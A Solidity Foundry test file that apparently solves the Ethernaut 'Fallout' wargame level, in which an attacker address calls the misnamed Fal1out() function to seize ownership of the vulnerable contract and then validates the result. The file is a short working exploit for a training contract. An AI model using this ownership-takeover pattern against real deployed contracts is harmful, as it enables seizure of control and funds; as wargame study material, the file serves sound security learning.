// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IFallout {
    function Fal1out() external;

    function owner() external view returns (address);
}

interface IFalloutFactory {
    function createInstance(address) external payable returns (address);

    function validateInstance(address payable, address) external returns (bool);
}

contract FalloutTest is Test {
    IFallout private fallout;
    IFalloutFactory private factory;
    address private attacker = makeAddr("attacker");

    function setUp() public {
        bytes memory code;

        code = vm.getDeployedCode("Fallout.sol");
        address falloutAddress = address(64);
        vm.etch(falloutAddress, code);

        code = vm.getDeployedCode("FalloutFactory.sol");
        address falloutFactoryAddress = address(164);
        factory = IFalloutFactory(falloutFactoryAddress);
        vm.etch(falloutFactoryAddress, code);

        fallout = IFallout(payable(factory.createInstance(attacker)));
    }

    function testFalloutContract() external {
        vm.deal(attacker, 1 ether);

        vm.startPrank(attacker);

        // Call Fal1out() function
        // this will set attacker as the new owner
        fallout.Fal1out();

        address newOwner = fallout.owner();
        assertEq(newOwner, attacker, "New owner not set. Attack failed.");

        // Verify solution using Ethernaut validation
        factory.validateInstance(payable(address(fallout)), attacker);
        vm.stopPrank();
    }
}
